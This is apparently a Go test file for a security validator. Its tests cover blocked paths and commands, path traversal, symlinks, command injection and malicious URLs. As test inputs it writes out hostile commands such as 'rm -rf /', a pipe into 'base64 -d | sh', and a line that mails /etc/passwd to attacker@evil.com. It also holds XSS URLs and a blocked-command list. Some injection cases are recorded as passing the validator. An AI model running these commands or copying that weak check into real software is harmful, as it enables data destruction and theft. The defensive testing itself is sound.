package security

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestNewDefaultValidator(t *testing.T) {
	v := NewDefaultValidator()

	if v == nil {
		t.Fatal("NewDefaultValidator returned nil")
	}

	// Check default blocked paths
	expectedBlockedPaths := []string{
		"/etc", "/usr/bin", "/usr/sbin", "/sbin", "/bin", "/sys", "/proc",
	}
	if len(v.blockedPaths) != len(expectedBlockedPaths) {
		t.Errorf("expected %d blocked paths, got %d", len(expectedBlockedPaths), len(v.blockedPaths))
	}

	// Check default blocked commands
	expectedBlockedCommands := []string{
		"sudo", "su", "chmod", "chown", "rm", "rmdir", "dd", "mkfs", "fdisk", "mount", "umount",
	}
	if len(v.blockedCommands) != len(expectedBlockedCommands) {
		t.Errorf("expected %d blocked commands, got %d", len(expectedBlockedCommands), len(v.blockedCommands))
	}

	// Check empty allowed lists
	if len(v.allowedPaths) != 0 {
		t.Errorf("expected 0 allowed paths, got %d", len(v.allowedPaths))
	}
	if len(v.allowedCommands) != 0 {
		t.Errorf("expected 0 allowed commands, got %d", len(v.allowedCommands))
	}
}

func TestWithAllowedPaths(t *testing.T) {
	v := NewDefaultValidator()
	paths := []string{"/home/user", "/tmp"}

	v.WithAllowedPaths(paths)

	if len(v.allowedPaths) != len(paths) {
		t.Errorf("expected %d allowed paths, got %d", len(paths), len(v.allowedPaths))
	}

	// Verify paths are copied, not referenced
	paths[0] = "/modified"
	if v.allowedPaths[0] == "/modified" {
		t.Error("allowed paths should be copied, not referenced")
	}
}

func TestWithBlockedPaths(t *testing.T) {
	v := NewDefaultValidator()
	initialBlockedCount := len(v.blockedPaths)
	additionalPaths := []string{"/custom/blocked", "/another/blocked"}

	v.WithBlockedPaths(additionalPaths)

	expectedCount := initialBlockedCount + len(additionalPaths)
	if len(v.blockedPaths) != expectedCount {
		t.Errorf("expected %d blocked paths, got %d", expectedCount, len(v.blockedPaths))
	}
}

func TestWithAllowedCommands(t *testing.T) {
	v := NewDefaultValidator()
	commands := []string{"ls", "cat", "echo"}

	v.WithAllowedCommands(commands)

	if len(v.allowedCommands) != len(commands) {
		t.Errorf("expected %d allowed commands, got %d", len(commands), len(v.allowedCommands))
	}

	// Verify commands are copied, not referenced
	commands[0] = "modified"
	if v.allowedCommands[0] == "modified" {
		t.Error("allowed commands should be copied, not referenced")
	}
}

func TestWithBlockedCommands(t *testing.T) {
	v := NewDefaultValidator()
	initialBlockedCount := len(v.blockedCommands)
	additionalCommands := []string{"dangerous", "risky"}

	v.WithBlockedCommands(additionalCommands)

	expectedCount := initialBlockedCount + len(additionalCommands)
	if len(v.blockedCommands) != expectedCount {
		t.Errorf("expected %d blocked commands, got %d", expectedCount, len(v.blockedCommands))
	}
}

func TestValidatePath(t *testing.T) {
	tests := []struct {
		name          string
		path          string
		allowedPaths  []string
		blockedPaths  []string
		wantErr       bool
		errorContains string
	}{
		// Basic validation tests
		{
			name:          "relative path should fail",
			path:          "relative/path",
			wantErr:       true,
			errorContains: "path must be absolute",
		},
		{
			name:          "empty path should fail",
			path:          "",
			wantErr:       true,
			errorContains: "path must be absolute",
		},
		{
			name:    "absolute path with no restrictions should pass",
			path:    "/home/user/file.txt",
			wantErr: false,
		},

		// Blocked paths tests - use paths that work across platforms
		{
			name:          "system path should fail when blocked",
			path:          "/system/blocked/file",
			blockedPaths:  []string{"/system/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "custom blocked path should fail",
			path:          "/custom/blocked/file",
			blockedPaths:  []string{"/custom/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},

		// Allowed paths tests
		{
			name:          "path outside allowed list should fail",
			path:          "/not/allowed/file",
			allowedPaths:  []string{"/home/user", "/tmp"},
			wantErr:       true,
			errorContains: "path not allowed",
		},
		{
			name:         "path inside allowed list should pass",
			path:         "/home/user/documents/file.txt",
			allowedPaths: []string{"/home/user"},
			wantErr:      false,
		},
		{
			name:         "path at allowed root should pass",
			path:         "/home/user",
			allowedPaths: []string{"/home/user"},
			wantErr:      false,
		},

		// Path traversal tests
		{
			name:          "path with .. traversal to blocked directory should fail",
			path:          "/allowed/user/../../blocked/secret",
			allowedPaths:  []string{"/allowed"},
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:         "path with .. staying in allowed directory should pass",
			path:         "/home/user/docs/../file.txt",
			allowedPaths: []string{"/home/user"},
			wantErr:      false,
		},
		{
			name:         "path with multiple .. traversals should be cleaned",
			path:         "/home/user/../user/./documents/../file.txt",
			allowedPaths: []string{"/home/user"},
			wantErr:      false,
		},

		// Edge cases
		{
			name:    "path with trailing slash should pass",
			path:    "/home/user/",
			wantErr: false,
		},
		{
			name:    "path with double slashes should be normalized",
			path:    "/home//user///file.txt",
			wantErr: false,
		},
		{
			name:         "path with . should be cleaned",
			path:         "/home/./user/./file.txt",
			allowedPaths: []string{"/home/user"},
			wantErr:      false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			if len(tt.allowedPaths) > 0 {
				v.WithAllowedPaths(tt.allowedPaths)
			}
			if len(tt.blockedPaths) > 0 {
				v.WithBlockedPaths(tt.blockedPaths)
			}

			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name            string
		cmd             string
		args            []string
		allowedCommands []string
		blockedCommands []string
		wantErr         bool
		errorContains   string
	}{
		// Basic validation
		{
			name:          "empty command should fail",
			cmd:           "",
			wantErr:       true,
			errorContains: "command cannot be empty",
		},
		{
			name:          "whitespace-only command should fail",
			cmd:           "   ",
			wantErr:       true,
			errorContains: "invalid command format",
		},
		{
			name:    "simple command should pass",
			cmd:     "echo hello",
			wantErr: false,
		},

		// Blocked commands
		{
			name:          "default blocked command sudo should fail",
			cmd:           "sudo apt-get update",
			wantErr:       true,
			errorContains: "command is blocked",
		},
		{
			name:          "default blocked command rm should fail",
			cmd:           "rm -rf /",
			wantErr:       true,
			errorContains: "command is blocked",
		},
		{
			name:            "custom blocked command should fail",
			cmd:             "dangerous-cmd",
			blockedCommands: []string{"dangerous-cmd"},
			wantErr:         true,
			errorContains:   "command is blocked",
		},

		// Allowed commands
		{
			name:            "command not in allowed list should fail",
			cmd:             "cat file.txt",
			allowedCommands: []string{"ls", "echo"},
			wantErr:         true,
			errorContains:   "command not allowed",
		},
		{
			name:            "command in allowed list should pass",
			cmd:             "ls -la",
			allowedCommands: []string{"ls", "cat"},
			wantErr:         false,
		},

		// Pattern matching
		{
			name:            "wildcard pattern in allowed commands should work",
			cmd:             "npm test",
			allowedCommands: []string{"npm*", "git*"},
			wantErr:         false,
		},
		{
			name:            "wildcard pattern in blocked commands should work",
			cmd:             "sudo-wrapper command",
			blockedCommands: []string{"sudo*"},
			wantErr:         true,
			errorContains:   "command is blocked",
		},

		// Command parsing
		{
			name:    "command with full path should extract basename",
			cmd:     "/usr/bin/echo hello",
			wantErr: false,
		},
		{
			name:          "blocked command with full path should fail",
			cmd:           "/usr/bin/sudo command",
			wantErr:       true,
			errorContains: "command is blocked",
		},
		{
			name:    "command with complex arguments should parse correctly",
			cmd:     `echo "hello world" | grep hello`,
			wantErr: false,
		},

		// Edge cases
		{
			name:    "command with leading spaces should work",
			cmd:     "  echo hello",
			wantErr: false,
		},
		{
			name:    "command with multiple spaces between arguments",
			cmd:     "echo    hello    world",
			wantErr: false,
		},
		{
			name:            "command with special characters in allowed list",
			cmd:             "test-cmd --option",
			allowedCommands: []string{"test-cmd"},
			wantErr:         false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			if len(tt.allowedCommands) > 0 {
				v.WithAllowedCommands(tt.allowedCommands)
			}
			if len(tt.blockedCommands) > 0 {
				v.WithBlockedCommands(tt.blockedCommands)
			}

			err := v.ValidateCommand(tt.cmd, tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

func TestValidateURL(t *testing.T) {
	tests := []struct {
		name          string
		url           string
		wantErr       bool
		errorContains string
	}{
		// Basic validation
		{
			name:          "empty URL should fail",
			url:           "",
			wantErr:       true,
			errorContains: "URL cannot be empty",
		},
		{
			name:    "valid HTTP URL should pass",
			url:     "http://example.com",
			wantErr: false,
		},
		{
			name:    "valid HTTPS URL should pass",
			url:     "https://example.com/path?query=value",
			wantErr: false,
		},

		// Invalid formats
		{
			name:          "invalid URL format should fail",
			url:           "not a url",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "URL with spaces should fail",
			url:           "https://example com",
			wantErr:       true,
			errorContains: "invalid URL format",
		},

		// Scheme validation
		{
			name:          "FTP scheme should fail",
			url:           "ftp://example.com",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "file scheme should fail",
			url:           "file:///etc/passwd",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "javascript scheme should fail",
			url:           "javascript:alert('xss')",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "data scheme should fail",
			url:           "data:text/plain;base64,SGVsbG8=",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},

		// Host validation
		{
			name:          "URL without host should fail",
			url:           "https://",
			wantErr:       true,
			errorContains: "URL must have a host",
		},
		{
			name:          "localhost should fail",
			url:           "http://localhost:8080",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "127.0.0.1 should fail",
			url:           "https://127.0.0.1/admin",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "::1 IPv6 localhost should fail",
			url:           "http://[::1]:3000",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "subdomain with localhost should fail",
			url:           "https://api.localhost.com",
			wantErr:       true,
			errorContains: "localhost access denied",
		},

		// Valid URLs with various formats
		{
			name:    "URL with port should pass",
			url:     "https://example.com:8443/path",
			wantErr: false,
		},
		{
			name:    "URL with authentication should pass",
			url:     "https://user:pass@example.com",
			wantErr: false,
		},
		{
			name:    "URL with fragment should pass",
			url:     "https://example.com/page#section",
			wantErr: false,
		},
		{
			name:    "URL with complex query should pass",
			url:     "https://example.com/search?q=test&page=1&limit=10",
			wantErr: false,
		},
		{
			name:    "IPv4 address should pass",
			url:     "https://192.168.1.1",
			wantErr: false,
		},
		{
			name:    "IPv6 address should pass",
			url:     "https://[2001:db8:85a3::8a2e:370:7334]",
			wantErr: false,
		},

		// Edge cases
		{
			name:    "URL with uppercase scheme should pass",
			url:     "HTTPS://example.com",
			wantErr: false,
		},
		{
			name:    "URL with international domain should pass",
			url:     "https://例え.jp",
			wantErr: false,
		},
		{
			name:    "very long URL should pass",
			url:     "https://example.com/" + strings.Repeat("a", 1000),
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			err := v.ValidateURL(tt.url)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateURL() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidateURL() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

func TestSanitizePath(t *testing.T) {
	tests := []struct {
		name         string
		path         string
		allowedPaths []string
		blockedPaths []string
		want         string
		wantErr      bool
	}{
		// Valid paths that should be cleaned
		{
			name:    "clean path should remain unchanged",
			path:    "/home/user/file.txt",
			want:    "/home/user/file.txt",
			wantErr: false,
		},
		{
			name:    "path with trailing slash should be cleaned",
			path:    "/home/user/",
			want:    "/home/user",
			wantErr: false,
		},
		{
			name:    "path with double slashes should be cleaned",
			path:    "/home//user///file.txt",
			want:    "/home/user/file.txt",
			wantErr: false,
		},
		{
			name:    "path with . should be cleaned",
			path:    "/home/./user/./file.txt",
			want:    "/home/user/file.txt",
			wantErr: false,
		},
		{
			name:    "path with .. should be resolved",
			path:    "/home/user/../user/file.txt",
			want:    "/home/user/file.txt",
			wantErr: false,
		},

		// Invalid paths
		{
			name:    "relative path should fail",
			path:    "relative/path",
			wantErr: true,
		},
		{
			name:         "blocked path should fail",
			path:         "/blocked/path/file",
			blockedPaths: []string{"/blocked"},
			wantErr:      true,
		},
		{
			name:         "path outside allowed list should fail",
			path:         "/not/allowed",
			allowedPaths: []string{"/home/user"},
			wantErr:      true,
		},

		// Complex cleaning scenarios
		{
			name:    "complex path with multiple cleaning needs",
			path:    "/home/./user/../user/docs/../../user/./file.txt",
			want:    "/home/user/file.txt",
			wantErr: false,
		},
	}

	// Skip backslash test on non-Windows platforms as filepath.Clean doesn't convert backslashes to forward slashes on Unix
	if runtime.GOOS == "windows" {
		tests = append(tests, struct {
			name         string
			path         string
			allowedPaths []string
			blockedPaths []string
			want         string
			wantErr      bool
		}{
			name:    "path with backslashes should be cleaned",
			path:    `/home\user\file.txt`,
			want:    "/home/user/file.txt",
			wantErr: false,
		})
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			if len(tt.allowedPaths) > 0 {
				v.WithAllowedPaths(tt.allowedPaths)
			}
			if len(tt.blockedPaths) > 0 {
				v.WithBlockedPaths(tt.blockedPaths)
			}

			got, err := v.SanitizePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("SanitizePath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if !tt.wantErr && got != tt.want {
				t.Errorf("SanitizePath() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestValidatorChaining(t *testing.T) {
	// Test that validator methods can be chained
	v := NewDefaultValidator().
		WithAllowedPaths([]string{"/home/user"}).
		WithBlockedPaths([]string{"/home/user/private"}).
		WithAllowedCommands([]string{"ls", "cat"}).
		WithBlockedCommands([]string{"dangerous"})

	// Test allowed path
	if err := v.ValidatePath("/home/user/documents/file.txt"); err != nil {
		t.Errorf("expected allowed path to pass, got error: %v", err)
	}

	// Test blocked path (custom)
	if err := v.ValidatePath("/home/user/private/secret.txt"); err == nil {
		t.Error("expected blocked path to fail")
	}

	// Test allowed command
	if err := v.ValidateCommand("ls -la", nil); err != nil {
		t.Errorf("expected allowed command to pass, got error: %v", err)
	}

	// Test blocked command (custom)
	if err := v.ValidateCommand("dangerous --force", nil); err == nil {
		t.Error("expected blocked command to fail")
	}
}

func TestConcurrentValidation(t *testing.T) {
	// Test that validator is safe for concurrent use
	v := NewDefaultValidator().
		WithAllowedPaths([]string{"/home/user"}).
		WithAllowedCommands([]string{"echo", "ls"})

	done := make(chan bool)
	errors := make(chan error, 100)

	// Run multiple goroutines performing validations
	for i := 0; i < 10; i++ {
		go func(id int) {
			defer func() { done <- true }()

			// Validate paths
			if err := v.ValidatePath("/home/user/file.txt"); err != nil {
				errors <- err
			}
			if err := v.ValidatePath("/etc/passwd"); err == nil {
				errors <- err
			}

			// Validate commands
			if err := v.ValidateCommand("echo test", nil); err != nil {
				errors <- err
			}
			if err := v.ValidateCommand("sudo rm -rf", nil); err == nil {
				errors <- err
			}

			// Validate URLs
			if err := v.ValidateURL("https://example.com"); err != nil {
				errors <- err
			}
			if err := v.ValidateURL("http://localhost"); err == nil {
				errors <- err
			}
		}(i)
	}

	// Wait for all goroutines to complete
	for i := 0; i < 10; i++ {
		<-done
	}
	close(errors)

	// Check for any errors
	for err := range errors {
		if err != nil {
			t.Errorf("concurrent validation error: %v", err)
		}
	}
}

// ============================================================================
// SECURITY ATTACK VECTOR TESTS
// ============================================================================

// TestPathTraversalAttacks tests various path traversal attack vectors
func TestPathTraversalAttacks(t *testing.T) {
	tests := []struct {
		name          string
		path          string
		blockedPaths  []string // Use explicit blocked paths for cross-platform testing
		wantErr       bool
		errorContains string
	}{
		// Classic path traversal attacks using explicit blocked paths
		{
			name:          "classic dotdot attack to sensitive directory",
			path:          "/home/user/../../../sensitive/secret.txt",
			blockedPaths:  []string{"/sensitive"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "multiple dotdot to access blocked area",
			path:          "/tmp/../../../../../../restricted/data",
			blockedPaths:  []string{"/restricted"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "dotdot with extra slashes",
			path:          "/home/user//..//..//..//blocked/file",
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "dotdot to system binaries",
			path:          "/tmp/../bin/sh",
			blockedPaths:  []string{"/bin"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "dotdot to proc filesystem",
			path:          "/var/../proc/self/environ",
			blockedPaths:  []string{"/proc"},
			wantErr:       true,
			errorContains: "path is blocked",
		},

		// Test default blocked paths (these work on systems where /proc exists)
		{
			name:          "proc filesystem access",
			path:          "/proc/self/environ",
			wantErr:       true, // /proc is in default blocked paths
			errorContains: "path is blocked",
		},

		// URL encoded path traversal attempts
		{
			name:    "percent encoded dotdot",
			path:    "/home/user/%2e%2e/%2e%2e/safe/file",
			wantErr: false, // filepath.Clean doesn't decode URLs
		},

		// Null byte injection attempts
		{
			name:    "null byte in path",
			path:    "/tmp/file.txt\x00.png",
			wantErr: false, // Go handles null bytes in paths safely
		},
		{
			name:          "null byte traversal",
			path:          "/blocked/secret\x00/safe/path",
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},

		// Windows-style path separators (should be handled by filepath.Clean)
		{
			name:    "backslash path separators",
			path:    "/home\\user\\..\\..\\safe\\file",
			wantErr: false, // Unix systems don't treat backslashes as separators
		},

		// Case variation attacks
		{
			name:         "case variation attack",
			path:         "/BLOCKED/secret",
			blockedPaths: []string{"/blocked"}, // Different case
			wantErr:      false,                // Case sensitive on Unix
		},

		// Alternative representations
		{
			name:          "double dot with current dir",
			path:          "/tmp/./../../blocked/secret",
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
		{
			name:          "multiple current directory refs",
			path:          "/./././blocked/secret",
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},

		// Extreme path lengths
		{
			name:          "very long dotdot chain",
			path:          "/tmp/" + strings.Repeat("../", 100) + "blocked/secret",
			blockedPaths:  []string{"/blocked"},
			wantErr:       true,
			errorContains: "path is blocked",
		},

		// Cross-platform symlink issues
		{
			name:          "path that resolves differently",
			path:          "/tmp/../var/log/test.log",
			blockedPaths:  []string{"/var/log"},
			wantErr:       true,
			errorContains: "path is blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			if len(tt.blockedPaths) > 0 {
				v = v.WithBlockedPaths(tt.blockedPaths)
			}
			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

// TestSymlinkAttacks tests symbolic link based attacks
func TestSymlinkAttacks(t *testing.T) {
	// Skip symlink tests if we can't create temporary files
	if testing.Short() {
		t.Skip("skipping symlink tests in short mode")
	}

	// Create temporary directory for testing
	tmpDir, err := os.MkdirTemp("", "validator_test_*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer func() { _ = os.RemoveAll(tmpDir) }()

	// Resolve tmpDir to handle macOS /var -> /private/var symlink
	tmpDir, err = filepath.EvalSymlinks(tmpDir)
	if err != nil {
		t.Fatalf("failed to resolve tmpDir symlinks: %v", err)
	}

	// Create a target file outside allowed area
	targetFile := filepath.Join(tmpDir, "target.txt")
	if err := os.WriteFile(targetFile, []byte("secret"), 0644); err != nil {
		t.Fatalf("failed to create target file: %v", err)
	}

	// Create symlink pointing to target
	allowedDir := filepath.Join(tmpDir, "allowed")
	if err := os.MkdirAll(allowedDir, 0755); err != nil {
		t.Fatalf("failed to create allowed dir: %v", err)
	}

	symlinkPath := filepath.Join(allowedDir, "link.txt")
	if err := os.Symlink(targetFile, symlinkPath); err != nil {
		t.Skipf("skipping symlink test, symlink creation failed: %v", err)
	}

	tests := []struct {
		name         string
		path         string
		allowedPaths []string
		wantErr      bool
	}{
		{
			name:         "symlink pointing outside allowed directory should fail",
			path:         symlinkPath,
			allowedPaths: []string{allowedDir},
			wantErr:      true,
		},
		{
			name:         "symlink pointing to allowed area should pass",
			path:         symlinkPath,
			allowedPaths: []string{tmpDir}, // Allow the entire temp dir
			wantErr:      false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator().WithAllowedPaths(tt.allowedPaths)
			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// TestCommandInjectionAttacks tests various command injection attack vectors
func TestCommandInjectionAttacks(t *testing.T) {
	tests := []struct {
		name          string
		cmd           string
		args          []string
		wantErr       bool
		errorContains string
	}{
		// Semicolon injection attacks
		{
			name:          "semicolon command injection",
			cmd:           "echo hello; rm -rf /",
			wantErr:       false, // Only first command word is validated
			errorContains: "",
		},
		{
			name:    "multiple semicolon commands",
			cmd:     "ls; cat /etc/passwd; wget malicious.com",
			wantErr: false, // Only first command is checked
		},

		// Ampersand injection attacks
		{
			name:    "ampersand background execution",
			cmd:     "sleep 1 & rm -rf /",
			wantErr: false, // Only first command word is validated
		},
		{
			name:    "double ampersand conditional",
			cmd:     "true && rm -rf /",
			wantErr: false, // Only first command word is validated
		},

		// Pipe injection attacks
		{
			name:    "pipe to dangerous command",
			cmd:     "cat file.txt | sudo tee /etc/passwd",
			wantErr: false, // Only first command word is validated
		},
		{
			name:    "complex pipe chain",
			cmd:     "echo data | base64 -d | sh",
			wantErr: false, // Only first command word is validated
		},

		// Backtick/command substitution attacks
		{
			name:    "backtick command substitution",
			cmd:     "echo `whoami`",
			wantErr: false, // Command parsing doesn't evaluate substitution
		},
		{
			name:    "dollar parentheses substitution",
			cmd:     "echo $(rm -rf /)",
			wantErr: false, // Command parsing doesn't evaluate substitution
		},

		// Redirection attacks
		{
			name:    "output redirection",
			cmd:     "echo secret > /etc/passwd",
			wantErr: false, // Only first command word is validated
		},
		{
			name:    "input redirection",
			cmd:     "mail attacker@evil.com < /etc/passwd",
			wantErr: false, // Only first command word is validated
		},

		// Environment variable attacks
		{
			name:    "environment variable in command",
			cmd:     "$SHELL -c 'rm -rf /'",
			wantErr: false, // Variable not expanded during validation
		},

		// Path manipulation attacks
		{
			name:          "relative path to blocked command",
			cmd:           "../../../bin/rm -rf /",
			wantErr:       true,
			errorContains: "command is blocked",
		},
		{
			name:          "hidden command with dots",
			cmd:           "./rm -rf /",
			wantErr:       true,
			errorContains: "command is blocked",
		},

		// Unicode and encoding attacks
		{
			name:    "unicode similar characters",
			cmd:     "ｒｍ -rf /", // Full-width characters
			wantErr: false,      // Different unicode characters
		},

		// Whitespace variations
		{
			name:          "tab separated command",
			cmd:           "rm\t-rf\t/",
			wantErr:       true,
			errorContains: "command is blocked",
		},
		{
			name:    "newline in command",
			cmd:     "echo\nrm -rf /",
			wantErr: false, // Newline treated as part of argument
		},

		// Null byte injection
		{
			name:    "null byte in command",
			cmd:     "echo\x00rm -rf /",
			wantErr: false, // Null byte handled safely by Go
		},

		// Very long commands
		{
			name:    "extremely long command",
			cmd:     "echo " + strings.Repeat("A", 10000),
			wantErr: false, // Length not validated
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			err := v.ValidateCommand(tt.cmd, tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

// TestMaliciousURLAttacks tests various malicious URL attack vectors
func TestMaliciousURLAttacks(t *testing.T) {
	tests := []struct {
		name          string
		url           string
		wantErr       bool
		errorContains string
	}{
		// JavaScript injection attacks
		{
			name:          "javascript protocol",
			url:           "javascript:alert('xss')",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "javascript with encoded characters",
			url:           "javascript%3Aalert('xss')",
			wantErr:       true,
			errorContains: "invalid URL scheme", // Go parses this as scheme "javascript%3Aalert"
		},
		{
			name:          "mixed case javascript",
			url:           "JaVaScRiPt:alert(1)",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},

		// Data URL attacks
		{
			name:          "data URL with script",
			url:           "data:text/html,<script>alert('xss')</script>",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "data URL with base64",
			url:           "data:text/plain;base64,SGVsbG8gV29ybGQ=",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},

		// File protocol attacks
		{
			name:          "file protocol to etc/passwd",
			url:           "file:///etc/passwd",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "file protocol windows",
			url:           "file://C:/Windows/System32/drivers/etc/hosts",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},

		// Other dangerous protocols
		{
			name:          "ftp protocol",
			url:           "ftp://malicious.com/upload",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "ldap protocol",
			url:           "ldap://evil.com/",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},
		{
			name:          "gopher protocol",
			url:           "gopher://evil.com:70/",
			wantErr:       true,
			errorContains: "invalid URL scheme",
		},

		// Localhost/internal network attacks
		{
			name:          "localhost with port",
			url:           "http://localhost:8080/admin",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "127.0.0.1 loopback",
			url:           "https://127.0.0.1:3000/",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "IPv6 loopback",
			url:           "http://[::1]:8000/",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:          "localhost subdomain",
			url:           "https://app.localhost.example.com",
			wantErr:       true,
			errorContains: "localhost access denied",
		},
		{
			name:    "alternative localhost representations",
			url:     "http://0.0.0.0:8080",
			wantErr: false, // Not explicitly blocked
		},

		// Private network ranges (not blocked by current implementation)
		{
			name:    "private IP 192.168.x.x",
			url:     "http://192.168.1.1/",
			wantErr: false, // Only localhost specifically blocked
		},
		{
			name:    "private IP 10.x.x.x",
			url:     "http://10.0.0.1:8080/",
			wantErr: false, // Only localhost specifically blocked
		},

		// Malformed URL attacks
		{
			name:          "URL with spaces",
			url:           "https://example .com",
			wantErr:       true,
			errorContains: "invalid URL format",
		},
		{
			name:          "URL with null bytes",
			url:           "https://example.com\x00.evil.com",
			wantErr:       true, // Go's url.Parse actually rejects this
			errorContains: "invalid URL format",
		},
		{
			name:          "URL with newlines",
			url:           "https://example.com\n\rLocation: evil.com",
			wantErr:       true, // Go's url.Parse actually rejects this
			errorContains: "invalid URL format",
		},

		// Unicode attacks
		{
			name:    "IDN homograph attack",
			url:     "https://аpple.com", // Cyrillic 'а' instead of Latin 'a'
			wantErr: false,               // Unicode domains are valid
		},
		{
			name:    "mixed script attack",
			url:     "https://gооgle.com", // Mix of Latin and Cyrillic
			wantErr: false,                // Unicode domains are valid
		},

		// Protocol confusion
		{
			name:    "uppercase HTTP",
			url:     "HTTP://example.com",
			wantErr: false, // Go normalizes schemes to lowercase
		},
		{
			name:    "mixed case scheme",
			url:     "HtTpS://example.com",
			wantErr: false, // Go normalizes schemes to lowercase
		},

		// Port manipulation
		{
			name:    "non-standard HTTP port",
			url:     "http://example.com:8080/",
			wantErr: false, // Non-standard ports are allowed
		},
		{
			name:    "very high port number",
			url:     "https://example.com:65535/",
			wantErr: false, // High ports are valid
		},

		// Extremely long URLs
		{
			name:    "very long URL",
			url:     "https://example.com/" + strings.Repeat("a", 5000),
			wantErr: false, // Length not limited
		},
		{
			name:    "long subdomain",
			url:     "https://" + strings.Repeat("sub.", 100) + "example.com",
			wantErr: false, // Long subdomains are valid
		},

		// Empty/missing components
		{
			name:          "empty host after scheme",
			url:           "https:///path",
			wantErr:       true,
			errorContains: "URL must have a host",
		},
		{
			name:          "scheme only",
			url:           "https://",
			wantErr:       true,
			errorContains: "URL must have a host",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v := NewDefaultValidator()
			err := v.ValidateURL(tt.url)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateURL() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if err != nil && tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
				t.Errorf("ValidateURL() error = %v, want error containing %q", err, tt.errorContains)
			}
		})
	}
}

// TestBoundaryConditions tests edge cases and boundary conditions
func TestBoundaryConditions(t *testing.T) {
	t.Run("empty inputs", func(t *testing.T) {
		v := NewDefaultValidator()

		// Empty path
		if err := v.ValidatePath(""); err == nil {
			t.Error("expected empty path to fail")
		}

		// Empty command
		if err := v.ValidateCommand("", nil); err == nil {
			t.Error("expected empty command to fail")
		}

		// Empty URL
